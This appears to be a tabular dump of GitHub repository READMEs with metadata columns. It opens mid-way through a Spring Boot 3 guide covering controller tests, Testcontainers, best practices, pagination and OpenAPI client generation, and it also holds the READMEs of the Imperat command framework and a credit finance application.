        given(customerService.getCustomerById(any(Long.class))).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(get(""/api/v1/customers/{id}"", 1L)
                .contentType(MediaType.APPLICATION_JSON));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isOk())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())))
                .andExpect(jsonPath(""$.results.id"", is(1)))
                .andExpect(jsonPath(""$.results.firstName"", is(""John"")))
                .andExpect(jsonPath(""$.results.lastName"", is(""Wick"")))
                .andExpect(jsonPath(""$.results.email"", is(""jwick@tester.com"")))
                .andExpect(jsonPath(""$.results.phoneNumber"", is(""0123456789"")))
                .andExpect(jsonPath(""$.results.dateOfBirth"", is(LocalDate.now().minusYears(18).toString())));
    }


    @Test
    void givenCustomerDTO_whenUpdateCustomer_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        given(customerMapper.customerRequestDTOToCustomerDTO(any(CustomerRequestDTO.class)))
                .willReturn(customerDTO);

        given(customerService.updateCustomer(any(Long.class), any(CustomerDTO.class))).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(put(""/api/v1/customers/{id}"", 1L)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(customerRequestDTO)));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isOk())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())))
                .andExpect(jsonPath(""$.results.id"", is(1)))
                .andExpect(jsonPath(""$.results.firstName"", is(""John"")))
                .andExpect(jsonPath(""$.results.lastName"", is(""Wick"")))
                .andExpect(jsonPath(""$.results.email"", is(""jwick@tester.com"")))
                .andExpect(jsonPath(""$.results.phoneNumber"", is(""0123456789"")))
                .andExpect(jsonPath(""$.results.dateOfBirth"", is(LocalDate.now().minusYears(18).toString())));
    }


    @Test
    void givenCustomerEmailUpdateDTO_whenUpdateCustomerEmail_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        CustomerEmailUpdateDTO customerEmailUpdateDTO = new CustomerEmailUpdateDTO();
        customerEmailUpdateDTO.setEmail(""loco@gmail.com"");
        customerDTO.setEmail(customerEmailUpdateDTO.getEmail());

        given(customerService.updateCustomerEmail(any(Long.class), any(CustomerEmailUpdateDTO.class)))
                .willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(patch(""/api/v1/customers/{id}/email"", 1L)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(customerEmailUpdateDTO)));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isOk())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())))
                .andExpect(jsonPath(""$.results.id"", is(1)))
                .andExpect(jsonPath(""$.results.firstName"", is(""John"")))
                .andExpect(jsonPath(""$.results.lastName"", is(""Wick"")))
                .andExpect(jsonPath(""$.results.email"", is(""loco@gmail.com"")))
                .andExpect(jsonPath(""$.results.phoneNumber"", is(""0123456789"")))
                .andExpect(jsonPath(""$.results.dateOfBirth"", is(LocalDate.now().minusYears(18).toString())));
    }


    @Test
    void givenCustomerDTO_whenDeleteCustomer_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        willDoNothing().given(customerService).deleteCustomer(any(Long.class));

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(delete(""/api/v1/customers/{id}"", 1L)
                .contentType(MediaType.APPLICATION_JSON));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isOk())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())));
    }


}
```

</details>


<br><br>

### Integration Testing

Integration Testing is the phase in software testing where individual units or components of an application are combined
and tested as a group. The main goal of integration testing is to verify the interactions between different modules and
to ensure that they work together as expected. In a Spring Boot application, this typically involves testing the full
stack, including the controller, service, repository layers, and the actual database.

### Using Docker with Testcontainers

In this project, we use [Testcontainers](https://testcontainers.com/) to facilitate integration testing with a real
PostgreSQL database running in a
Docker container. This ensures that our tests run in an environment that closely mirrors production.

#### Note

To run these integration tests, Docker needs to be running on your machine. However, if Docker is not available or
running, the tests will automatically be skipped. This is managed by the following annotation in the test class:

```java
@Testcontainers(disabledWithoutDocker = true)
```

**What This Means:**

- **If Docker is running:** The integration tests will run as usual.
- **If Docker is not running:** The tests won't run, so you won't get any errors related to Docker not being available.

This setup ensures that you won't face issues with integration tests if you don’t have Docker running. It’s a way to
avoid unnecessary errors and make sure you can keep working without interruptions, especially if you're new and still
setting up your environment.

If you need to run the integration tests, just make sure Docker is installed and running on your machine.

---

## 12. Best Practices

**Disclaimer**: The practices outlined here reflect my personal approach based on what I have learned and observed from
various resources. While I believe these practices can help in building clean, maintainable, and scalable Spring Boot
applications, they are by no means the only way to approach development. I encourage you to explore other perspectives,
adapt these practices to your needs, and continuously evolve your methods as new tools and techniques emerge.

When developing Spring Boot applications, following best practices ensures your code is clean, maintainable, and
scalable. Below are some key practices to keep in mind:

### 1. Use DTOs to Abstract Entity Data

- **Purpose**: DTOs (Data Transfer Objects) are used to encapsulate data transferred between the client and server. By
  using DTOs, you prevent exposing your JPA entities directly to the client, which can mitigate security risks and
  decouple your API's data model from its internal domain model.
- **Implementation**:
    - Use tools like MapStruct or write custom mappers to convert between entities and DTOs.
    - Ensure that your controllers interact with services using DTOs, not entities, to maintain a clear separation of
      concerns.

### 2. Leverage Spring’s Dependency Injection

- **Purpose**: Dependency Injection (DI) allows for the automatic management of your application’s dependencies,
  promoting loose coupling and easier testing.
- **Best Practices**:
    - **Use Constructor Injection**: Prefer constructor injection over field injection as it makes your classes easier
      to test, clearly indicates the dependencies of your class, and supports immutability.
    - **Avoid Field Injection**: Field injection can lead to issues in unit testing and hides dependencies, making the
      code harder to understand and maintain.
    - **Use `@Autowired`**: Spring’s `@Autowired` annotation can be used to inject dependencies, but constructor
      injection is more explicit and recommended.

### 3. Handle Exceptions Globally

- **Purpose**: Centralized exception handling allows you to manage errors consistently across your application,
  improving the user experience and simplifying error management.
- **Implementation**:
    - Use `@ControllerAdvice` to create a global exception handler that handles exceptions thrown across the
      application.
    - Use `@ExceptionHandler` within `@ControllerAdvice` to specify custom handling logic for specific exception types.
    - Return structured error responses using a consistent format, which can be encapsulated in a DTO like
      `APIResponse`.

### 4. Organize Your Code

- **Purpose**: A well-organized codebase makes the project easier to navigate, understand, and maintain, especially as
  it grows in complexity.
- **Best Practices**:
    - **Separate Concerns**: Maintain a clean and organized project structure by separating concerns into different
      layers (e.g., controllers, services, repositories).
    - **Keep Methods Small**: Break down large methods into smaller, single-purpose methods to enhance readability and
      maintainability. Each method should do one thing and do it well.
    - **Avoid Repetition**: Follow the DRY (Don't Repeat Yourself) principle by abstracting common logic into reusable
      methods or classes.

### 5. Naming Conventions

- **Purpose**: Consistent naming conventions improve the readability and maintainability of your code, making it easier
  for other developers (and your future self) to understand the purpose of classes, methods, and variables.
- **Best Practices**:
    - **Packages**: Use lowercase and singular names for packages (e.g., `com.ainigma100.customerapi.controller`).
    - **Classes**: Follow PascalCase for class names (e.g., `CustomerService`), and ensure names are meaningful and
      descriptive.
    - **Methods**: Use camelCase for method names (e.g., `getCustomerById`) and keep method names descriptive to reflect
      their actions.
    - **Endpoints**: Use lowercase and hyphen-separated words for REST API endpoint paths (e.g., `/api/v1/customers`),
      and use plural nouns for collections (e.g., `/customers`).

### 6. Use Wrapper Objects for API Responses

- **Purpose**: Wrapping API responses in a standardized object (like `APIResponse`) ensures consistent structure,
  improves readability, and makes it easier to include additional metadata (e.g., status, errors) along with the actual
  data.
- **Implementation**:
    - **Standardized Structure**: Define a generic response class that encapsulates the response data, status, and any
      errors. This approach provides a uniform response format across all endpoints.
    - **Builder Pattern**: Use the Builder pattern to construct response objects, which enhances readability and
      flexibility by allowing you to add only the fields you need.
    - **Consistency**: Return response objects in all your controller methods to ensure that clients receive a
      consistent response format, which simplifies client-side parsing and error handling.

### 7. Break Down Complex Logic

- **Purpose**: Breaking down complex logic into smaller, manageable pieces makes your code easier to understand, test,
  and maintain.
- **Best Practices**:
    - **Refactor Large Methods**: If a method is doing too much, refactor it into smaller methods that each handle a
      specific part of the logic. This improves readability, makes your code more modular, and simplifies testing.
    - **Single Responsibility Principle (SRP)**: Ensure that each class and method has only one responsibility. This
      principle helps to make your code more focused, easier to maintain, and less prone to errors.
    - **Avoid Deep Nesting**: Deeply nested code blocks can be hard to follow and maintain. Consider early exits (using
      return statements) and breaking nested blocks into separate methods to enhance clarity.

### 8. Document Your Code

- **Purpose**: Well-documented code helps new developers understand the application quickly and ensures that the purpose
  of classes and methods is clear.
- **Best Practices**:
    - **Use Swagger for API Documentation**: Instead of using only the traditional Javadoc comments, leverage Swagger
      annotations to document your APIs. This approach provides interactive documentation that clients can use to
      understand and test your services.
    - **Descriptive Method and Property Names**: Ensure that your method and property names are self-explanatory, making
      the code easier to read and understand without requiring extensive comments.
    - **Generate and Share Swagger Documentation**: Utilize classes to generate Swagger documentation and export it as a
      file. This allows you to share the API documentation easily with others, ensuring they have the necessary
      information to interact with your services. You can reuse the classes I wrote in the current project.
    - **Inline Comments**: Use inline comments sparingly to explain complex logic or to provide context about why
      certain decisions were made. Comments should add value by explaining the ""why"" behind the code, not the ""what."" If
      your code is clear on what it does, it is not mandatory to add comments.

### 9. Version Control and CI/CD

- **Purpose**: Implementing a robust version control and CI/CD (Continuous Integration/Continuous Deployment) pipeline
  ensures that your codebase is always in a deployable state and that changes are tracked, reviewed, and integrated
  systematically.
- **Best Practices**:
    - **Git**: Use Git for version control, and follow a branching strategy (e.g., GitFlow) to manage feature
      development, bug fixes, and releases. Commit often with meaningful commit messages to document the history of your
      project.
    - **Code Reviews**: Incorporate code reviews into your development process to catch issues early, share knowledge
      across the team, and maintain code quality.
    - **CI/CD Pipeline**: Set up a CI/CD pipeline using tools like Jenkins, GitHub Actions, GitLab CI, or CircleCI to
      automate the building, testing, and deployment of your application. This pipeline should include:
        - **Automated Testing**: Ensure that all tests run automatically on every commit to catch issues early.
        - **Code Quality Checks**: Integrate tools like SonarQube or Checkstyle to enforce coding standards and detect
          potential issues.
        - **Deployment Automation**: Automate the deployment process to reduce manual errors and speed up delivery.

### 10. Database Migrations with Liquibase or Flyway

- **Purpose**: Database migration tools like Liquibase and Flyway help manage schema changes in a consistent and
  controlled manner. They are particularly useful in environments where the database schema evolves over time.
- **When to Use**:
    - **Use Case**: If your application requires frequent schema changes, or if you work in a team where multiple
      developers are modifying the database, using a migration tool is essential. It ensures that all changes are
      versioned, documented, and applied consistently across different environments (development, testing, production).
    - **When Not Needed**: If your application uses a fixed schema that rarely changes, or if you're using a database
      with a predefined schema where you don't manage the tables (e.g., a third-party service), you might not need a
      migration tool. In such cases, focusing on data access rather than schema management is more appropriate.
- **Best Practices**:
    - **Version Control for Migrations**: Always check your migration scripts into version control alongside your
      application code. This ensures that schema changes are versioned with the corresponding application changes.
    - **Automate Migrations**: Integrate your migration tool into your CI/CD pipeline to ensure that migrations are
      applied automatically during deployment, reducing the risk of human error.

### 11. Static Code Analysis with SonarQube

- **Purpose**: SonarQube helps improve code quality by automatically detecting issues like bugs, security
  vulnerabilities, and code smells.

- **Best Practices**:
    - **Integrate into CI/CD**: Add SonarQube to your CI/CD pipeline so that your code is checked for quality every time
      you commit or create a pull request.
    - **Set Quality Gates**: Define thresholds for things like code coverage and bugs in SonarQube to ensure your code
      meets quality standards before it’s merged.
    - **Act on Reports**: Regularly review SonarQube reports and fix any issues it finds, focusing on critical problems
      first.
    - **Team Awareness**: Make sure your team understands how to use SonarQube reports to improve their code.
    - **Manage Technical Debt**: Use SonarQube to track and reduce technical debt by identifying areas that need
      refactoring.

---

## 13. Enhanced Pagination Example

Pagination is an essential feature when dealing with large datasets in any application. It helps in breaking down large
amounts of data into manageable chunks, improving both performance and user experience. In this section, I will walk
through an enhanced pagination implementation using Spring Boot that you can adapt for your own projects.

This example will demonstrate how to retrieve paginated and sorted customer data from the database, leveraging custom
search criteria.

### CustomerSearchCriteriaDTO

The `CustomerSearchCriteriaDTO` class is used to encapsulate the search criteria that the client sends to the server.
This DTO not only includes pagination parameters like page and size but also allows for sorting and filtering based on
various fields like firstName, lastName, email, etc.

It’s important to note that all the search fields `firstName`, `lastName`, `email`, `phoneNumber`, and `dateOfBirth` are
optional. You can use them to filter records based on the criteria you need. If no filtering is needed, you can simply
pass the pagination and sorting details.

<details>
  <summary>View CustomerSearchCriteriaDTO code</summary>

```java
package com.ainigma100.customerapi.dto;

import com.ainigma100.customerapi.utils.SortItem;
import io.swagger.v3.oas.annotations.media.Schema;
import jakarta.validation.constraints.*;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.Setter;

import java.time.LocalDate;
import java.util.List;

@Setter
@Getter
@RequiredArgsConstructor
public class CustomerSearchCriteriaDTO {

    private String firstName;
    private String lastName;
    private String email;
    private String phoneNumber;
    private LocalDate dateOfBirth;

    @NotNull(message = ""page cannot be null"")
    @PositiveOrZero(message = ""page must be a zero or a positive number"")
    private Integer page;

    @Schema(example = ""10"")
    @NotNull(message = ""size cannot be null"")
    @Positive(message = ""size must be a positive number"")
    private Integer size;

    private List<SortItem> sortList;

}
```

</details>



For example, you can send a request like this:

```json
{
  ""page"": 0,
  ""size"": 10,
  ""sortList"": [
    {
      ""field"": ""id"",
      ""direction"": ""ASC""
    }
  ]
}
```

Assuming you have this record in your database:

```json
{
  ""id"": 2,
  ""firstName"": ""marco"",
  ""lastName"": ""polo"",
  ""email"": ""mpolo@gmail.com"",
  ""phoneNumber"": ""1234567891"",
  ""dateOfBirth"": ""2004-08-13""
}
```

If you need to filter only by firstName, you can send a request like this:

```json
{
  ""firstName"": ""marco"",
  ""page"": 0,
  ""size"": 10,
  ""sortList"": [
    {
      ""field"": ""id"",
      ""direction"": ""ASC""
    }
  ]
}
```

**Note**: You can experiment with different combinations of filters and pagination parameters based on your needs.

### Repository Query for Pagination and Filtering

The following query is responsible for handling pagination and filtering.

```java

@Query(value = """"""
        select cus from Customer cus
        where ( :#{#criteria.firstName} IS NULL OR LOWER(cus.firstName) LIKE LOWER( CONCAT(:#{#criteria.firstName}, '%') ) )
        and ( :#{#criteria.lastName} IS NULL OR LOWER(cus.lastName) LIKE LOWER( CONCAT(:#{#criteria.lastName}, '%') ) )
        and ( :#{#criteria.email} IS NULL OR LOWER(cus.email) LIKE LOWER( CONCAT('%', :#{#criteria.email}, '%') ) )
        and ( :#{#criteria.phoneNumber} IS NULL OR LOWER(cus.phoneNumber) LIKE LOWER( CONCAT('%', :#{#criteria.phoneNumber}, '%') ) )
        and ( :#{#criteria.dateOfBirth} IS NULL OR cus.dateOfBirth = :#{#criteria.dateOfBirth} )
        """""")
Page<Customer> getAllCustomersUsingPagination(
        @Param(""criteria"") CustomerSearchCriteriaDTO customerSearchCriteriaDTO,
        Pageable pageable);
```

### Query Analysis

The query allows you to filter customer data based on the criteria you provide. Here’s how it works:

- **Flexible Filters**: Each field, like `firstName` or `email`, can be used to filter results. If you don’t need a
  specific filter, you can leave it out, and the query will ignore that field.
- **Examples**:
    - **Filtering by First Name**: If you provide a `firstName`, the query looks for customers whose names start with
      that value.
    - **Flexible Email Search**: The query can find customers even if you provide only part of their email address.

This approach makes the query easy to use and flexible for different search needs.

### Utils Class

To facilitate pagination and sorting, a utility class is often needed. Below is an example of a utility class that helps
in creating pageable objects based on the SortItem list provided in the DTO.

<details>
  <summary>View Utils code</summary>

```java
package com.ainigma100.customerapi.utils;

import lombok.extern.slf4j.Slf4j;
import org.springframework.data.domain.PageRequest;
import org.springframework.data.domain.Pageable;
import org.springframework.data.domain.Sort;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.function.Supplier;

@Slf4j
public class Utils {

    // Private constructor to prevent instantiation
    private Utils() {
        throw new IllegalStateException(""Utility class"");
    }


    /**
     * Retrieves a value from a Supplier or sets a default value if a NullPointerException occurs.
     * Usage example:
     *
     * <pre>{@code
     * // Example 1: Retrieve a list or provide an empty list if null
     * List<Employee> employeeList = Utils.retrieveValueOrSetDefault(() -> someSupplierMethod(), new ArrayList<>());
     *
     * // Example 2: Retrieve an Employee object or provide a default object if null
     * Employee emp = Utils.retrieveValueOrSetDefault(() -> anotherSupplierMethod(), new Employee());
     * }</pre>
     *
     * @param supplier     the Supplier providing the value to retrieve
     * @param defaultValue the default value to return if a NullPointerException occurs
     * @return the retrieved value or the default value if a NullPointerException occurs
     * @param <T>          the type of the value
     */
    public static <T> T retrieveValueOrSetDefault(Supplier<T> supplier, T defaultValue) {

        try {
            return supplier.get();

        } catch (NullPointerException ex) {

            log.error(""Error while retrieveValueOrSetDefault {}"", ex.getMessage());

            return defaultValue;
        }
    }


    public static Pageable createPageableBasedOnPageAndSizeAndSorting(List<SortItem> sortList, Integer page, Integer size) {

        List<Sort.Order> orders = new ArrayList<>();

        if (sortList != null) {
            // iterate the SortList to see based on which attributes we are going to Order By the results.
            for (SortItem sortValue : sortList) {
                orders.add(new Sort.Order(sortValue.getDirection(), sortValue.getField()));
            }
        }


        return PageRequest.of(
                Optional.ofNullable(page).orElse(0),
                Optional.ofNullable(size).orElse(10),
                Sort.by(orders));
    }

}
```

</details>

### SortItem

The SortItem class encapsulates the sorting criteria, including the field to be sorted and the direction (ascending or
descending).

<details>
  <summary>View SortItem code</summary>

```java
package com.ainigma100.customerapi.utils;

import io.swagger.v3.oas.annotations.media.Schema;
import lombok.Getter;
import org.springframework.data.domain.Sort;

import java.io.Serializable;

@Getter
public class SortItem implements Serializable {


    @Schema(example = ""id"") // set a default sorting property for swagger
    private String field;
    private Sort.Direction direction;

}
```

</details>


**Note**: You can check the implementation and the testing of this feature by reading the code.

By implementing enhanced pagination, you ensure that your application can efficiently handle large datasets while
providing users with a responsive experience. This approach is versatile and can be adapted to various other scenarios
in your application.

---

## 14. Appendix: Using `openapi-generator-maven-plugin` for API Client Generation

**The configuration in this section is not part of the current project but is provided to share it with the community
for educational purposes. You will not find it in the codebase, but you may find it useful if you need to generate 
client code for an external API.**

### Overview

In many cases, when working with external APIs, the provider may supply an OpenAPI (Swagger) specification. Instead of
manually creating models and client code, you can use the `openapi-generator-maven-plugin` to automate this process.
This saves development time and ensures the API client and models are always in sync with the specification.

### Why Use This Plugin?

The `openapi-generator-maven-plugin` is particularly useful in scenarios such as:

- **Integrating with Third-Party APIs**: You can generate client code automatically based on external API
  specifications (Swagger).
- **Maintaining Consistency**: When APIs change frequently, auto-generating code ensures that your models and API
  clients remain consistent with the latest API definitions.
- **Avoiding Manual Model Creation**: Instead of creating Java models for responses manually, you can generate them
  directly from the Swagger spec.
- **Time-Saving**: Automating the process of generating client code from API definitions saves time and effort when
  integrating with complex or frequently changing APIs.

### Benefits of Using OpenAPI Generator

1. **Auto-Generated API Clients**: Automatically generate Java client code to call external APIs, avoiding the need to
   manually code the clients.
2. **Consistent Models**: Ensure consistency between the API models and the actual API by generating them from the spec.
3. **Faster Development**: Automates the client code generation process, allowing you to quickly integrate with
   third-party APIs.
4. **Swagger Files for External API Calls**: When provided with a Swagger spec for an external API, you can generate the
   client code and models instead of writing them by hand.

**Note**: Most of the time I use it to check the APIs and to avoid implementing the Java objects they return.

### How to Use `openapi-generator-maven-plugin`

Although this is not part of the current project, here's an example of how you could configure the plugin to generate
client code for external APIs:

### Step 1: Add the Swagger Files

Create a folder named swagger inside src/main/resources and place your OpenAPI specification files (in JSON or YAML
format) inside.

```
├── src/
│   ├── main/
│   │   ├── java/
│   │   └── resources/
│   │       └── swagger/
│   │           ├── department-api.json
```

### Step 2: Configure `pom.xml`

Before adding new dependencies, check if you already have similar dependencies to avoid conflicts. Add the necessary
properties and dependencies:

```xml

<properties>
    <!-- other properties -->

    <!-- Add the latest versions -->
    <springdoc-openapi-starter-webmvc-ui.version>2.6.0</springdoc-openapi-starter-webmvc-ui.version>
    <openapi-generator-maven-plugin.version>7.8.0</openapi-generator-maven-plugin.version>
    <jackson-databind-nullable.version>0.2.6</jackson-databind-nullable.version>
</properties>
```

Add the required dependencies:

```xml

<dependency>
    <groupId>org.springdoc</groupId>
    <artifactId>springdoc-openapi-starter-webmvc-ui</artifactId>
    <version>${springdoc-openapi-starter-webmvc-ui.version}</version>
</dependency>

<dependency>
<groupId>org.openapitools</groupId>
<artifactId>jackson-databind-nullable</artifactId>
<version>${jackson-databind-nullable.version}</version>
</dependency>
```

### Step 3: Add the OpenAPI Generator Plugin

```xml

<plugin>
    <groupId>org.openapitools</groupId>
    <artifactId>openapi-generator-maven-plugin</artifactId>
    <version>${openapi-generator-maven-plugin.version}</version>
    <executions>
        <!-- Generate Department API client code -->
        <execution>
            <id>department-api</id>
            <goals>
                <goal>generate</goal>
            </goals>
            <configuration>
                <inputSpec>${project.basedir}/src/main/resources/swagger/department-api.json</inputSpec>
                <generatorName>spring</generatorName>
                <output>${project.build.directory}/gen-openapi/department</output>
                <apiPackage>${project.groupId}.department.api</apiPackage>
                <modelPackage>${project.groupId}.department.model</modelPackage>
                <generateSupportingFiles>true</generateSupportingFiles>
                <configOptions>
                    <delegatePattern>true</delegatePattern>
                    <interfaceOnly>true</interfaceOnly>
                    <useSpringBoot3>true</useSpringBoot3>
                    <cleanupOutput>true</cleanupOutput>
                </configOptions>
            </configuration>
        </execution>

        <!-- You can add more files here as a new execution. Just be sure to have different 'id' -->

    </executions>
</plugin>
```

### Step 4: Run Maven Command

Run the following Maven command to generate the code based on the OpenAPI specifications.

```shell
mvn clean install
```

As soon as you run the above command, you will notice that some generated files have been
created in the target folder. You will find inside there the ```APIs``` and the ```Models```.

```
├── target/
│   └── gen-openapi/
│       ├── department/
```

### Step 5: Generate Sources and Update Folders (if necessary)

If after running `mvn clean install` you find that the generated models are not imported into your project, you may need
to manually update the project sources. Follow these steps:

1. Right-click on your project in your IntelliJ.
2. Navigate to `Maven` → `Generate Sources and Update Folders`.

This action triggers Maven to re-import the generated sources into your project. After completion, verify that the
generated models are now accessible within your project structure.

### Additional Configurations

The `openapi-generator-maven-plugin` offers a variety of configurations to customize the generated code, such as
generating different types of API clients, models, or server stubs. You can explore more configurations and options in
the official plugin documentation
found https://github.com/OpenAPITools/openapi-generator/tree/master/modules/openapi-generator-maven-plugin.

### Summary

Using tools like `openapi-generator-maven-plugin` can save time and effort when working with external APIs. It automates
the creation of client code and models, ensuring that they are always consistent with the API spec, without manual
intervention. Although not included in this guide's codebase, this is a useful technique for certain scenarios where you
frequently call external services based on OpenAPI specifications.

---

## 15. Feedback and Contributions

Feedback and contributions are welcome! If you have suggestions, improvements, or additional insights, please feel free
to share. Together, we can make this a valuable resource for anyone learning Spring Boot 3.

",0,0,1,1.0,"['spring', 'boot', 'knowledge', 'share', 'table', 'content', 'introduction', 'what', 'spring', 'boot', 'why', 'use', 'spring', 'boot', 'project', 'structure', 'overview', 'package', 'their', 'purpose', 'introduction', 'maven', 'what', 'maven', 'what', 'pom', 'key', 'concept', 'pom', 'project', 'coordinate', 'dependency', 'plugins', 'example', 'file', 'customer', 'api', 'dependency', 'include', 'add', 'more', 'dependency', 'explanation', 'plugin', 'configuration', 'key', 'annotation', 'spring', 'boot', 'spring', 'boot', 'annotation', 'dependency', 'injection', 'component', 'scan', 'entity', 'class', 'annotation', 'controller', 'class', 'annotation', 'configuration', 'bean', 'management', 'event', 'handle', 'lombok', 'annotation', 'additional', 'note', 'dependency', 'injection', 'spring', 'boot', 'why', 'use', 'dependency', 'injection', 'constructor', 'injection', 'use', 'lombok', 'simplify', 'constructor', 'injection', 'the', 'autowired', 'annotation', 'without', 'use', 'lombok', 'annotation', 'why', 'constructor', 'injection', 'better', 'design', 'pattern', 'restful', 'api', 'mvc', 'restful', 'api', 'architecture', 'mvc', 'difference', 'between', 'restful', 'api', 'mvc', 'choose', 'right', 'pattern', 'name', 'convention', 'package', 'name', 'class', 'naming', 'entity', 'name', 'api', 'endpoint', 'naming', 'configure', 'why', 'general', 'configuration', 'configuration', 'activate', 'profile', 'best', 'practice', 'example', 'file', 'customer', 'api', 'specify', 'active', 'profile', 'note', 'detail', 'package', 'breakdown', 'entity', 'layer', 'why', 'not', 'use', 'data', 'importance', 'equal', 'hashcode', 'additional', 'column', 'specification', 'repository', 'layer', 'query', 'method', 'overview', 'derive', 'query', 'method', 'custom', 'query', 'query', 'native', 'query', 'when', 'use', 'native', 'query', 'dtos', 'mapstruct', 'key', 'concept', 'service', 'layer', 'key', 'concept', 'controller', 'layer', 'key', 'concept', 'http', 'method', 'annotation', 'exception', 'handle', 'global', 'exception', 'handler', 'custom', 'exception', 'structured', 'error', 'response', 'helper', 'class', 'openapiconfig', 'loggingfilter', 'filtersconfig', 'serverdetails', 'test', 'unit', 'test', 'behavior', 'driven', 'development', 'bdd', 'test', 'intellij', 'live', 'template', 'bdd', 'test', 'repository', 'layer', 'test', 'service', 'layer', 'test', 'controller', 'layer', 'key', 'point', 'note', 'integration', 'test', 'use', 'docker', 'testcontainers', 'note', 'best', 'practice', 'use', 'dtos', 'abstract', 'entity', 'data', 'leverage', 'spring', 's', 'dependency', 'injection', 'handle', 'exception', 'globally', 'organize', 'your', 'code', 'name', 'convention', 'use', 'wrapper', 'object', 'api', 'response', 'break', 'down', 'complex', 'logic', 'document', 'your', 'code', 'version', 'control', 'database', 'migration', 'liquibase', 'flyway', 'static', 'code', 'analysis', 'sonarqube', 'enhance', 'pagination', 'example', 'customersearchcriteriadto', 'repository', 'query', 'pagination', 'filtering', 'query', 'analysis', 'utils', 'class', 'sortitem', 'appendix', 'using', 'api', 'client', 'generation', 'overview', 'why', 'use', 'this', 'plugin', 'benefit', 'use', 'openapi', 'generator', 'how', 'use', 'step', 'add', 'swagger', 'file', 'step', 'configure', 'step', 'add', 'openapi', 'generator', 'plugin', 'step', 'run', 'maven', 'command', 'step', 'generate', 'source', 'update', 'folder', 'if', 'necessary', 'additional', 'configuration', 'summary', 'feedback', 'contribution']","['use', 'api', 'annotation', 'query', 'spring']"
VelixDevelopments/Imperat,master,"[![Discord](https://discord.com/api/guilds/1285395980610568192/widget.png)](https://discord.velix.dev/)
[![Maven Central](https://img.shields.io/maven-metadata/v/https/repo1.maven.org/maven2/dev/velix/imperat-core/maven-metadata.xml.svg?label=maven%20central&colorB=brightgreen)](https://search.maven.org/artifact/dev.velix/imperat-core)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Build](https://github.com/VelixDevelopments/Imperat/actions/workflows/build.yml/badge.svg)](https://github.com/VelixDevelopments/Imperat/actions/workflows/build.yml)

# Imperat

**Imperat** is a high-performance, general-purpose command dispatching framework built in Java.
Designed to be platform-agnostic, Imperat is capable of handling massive numbers of commands efficiently.
Whether you're building microservices, game engines, or any other system that requires command dispatching,
Imperat provides a flexible and powerful foundation, that can handle complex command graphs incluing middle optional
arguments,
with a smart algorithm called `SmartUsageResolve`.

## Features

- **Generic Command Dispatching:** Dispatch commands across multiple platforms and systems seamlessly.
- **High Performance:** Engineered to manage large volumes of commands with minimal overhead.
- **Platform-Agnostic:** Works across different platforms, making it suitable for a wide variety of projects.

## Installation

Imperat is available on Maven Central.<br>
You can install it using either Maven or Gradle.<br>
Replace `PLATFORM` with your desired platform and `VERSION` with the latest version available.

### Using Gradle

```gradle
dependencies {
    implementation ""dev.velix:imperat-core:VERSION""
    implementation ""dev.velix:imperat-PLATFORM:VERSION""
}
```

### Using Maven

```xml

<dependencies>
  <dependency>
    <groupId>dev.velix</groupId>
    <artifactId>imperat-core</artifactId>
    <version>VERSION</version>
  </dependency>

  <dependency>
    <groupId>dev.velix</groupId>
    <artifactId>imperat-PLATFORM</artifactId>
    <version>VERSION</version>
  </dependency>
</dependencies>

```

## Supported platforms

Imperat supports the following platforms:

- Bukkit
- Minestom
- Velocity
- Bungeecord
- CLI (Command Line Interface)

## Documentation

For detailed usage instructions, architecture overview, and API documentation,<br>
visit the official [Imperat Documentation](https://docs.velix.dev/Imperat/).

## Join the Community

If you have any questions, ideas,
or want to connect with other developers using Imperat, join our community on [Discord](https://discord.velix.dev/).

## License

Imperat is released under the MIT License. See `LICENSE` for more information.

## Credits

- Mqzn and iiAhmedYT (the original authors of Imperat) <br>
  Some features/ideas were inspired from [Lamp](https://github.com/Revxrsal/Lamp).
",6,2,1,0.0,"['imperat', 'feature', 'installation', 'use', 'gradle', 'use', 'maven', 'support', 'platform', 'documentation', 'join', 'community', 'license', 'credit']","['use', 'imperat', 'feature', 'installation', 'gradle']"
aliFetvaci61/credit-finance-application,master,"# Credit Finance Application

This project is a credit application. Users can register and log in to the application and take out credits and pay the installments of these credits.

## General Features

- Users can register
- Users can log in.
- Users take out credits
- Users can view the credits they have taken out
- Users can view the installments of credits
- Users can pay the installments of credits

## Technologies Used
- Java 17: A modern, performant, and up-to-date language used in the application.
- Spring Boot: A framework for building Spring-based applications quickly and easily.
- Docker: A containerization platform for quick deployment and running of the application.
- Kafka: A distributed messaging system used for event processing and data streaming.
- Elasticsearch: An open-source search engine used for high-performance search, analytics, and data storage.
- MySQL: A relational database management system used for data storage and management.
- PostgreSQL: A relational database management system used for data storage and management.
- Redis: An in-memory, NoSQL key/value store database management system

## Design Patterns Used
- API Gateway pattern
  - Routing
  - Transformation
  - Security
- Command Query Responsibility Segregation pattern
- Database per service pattern
- Event-Driven Architecture Pattern
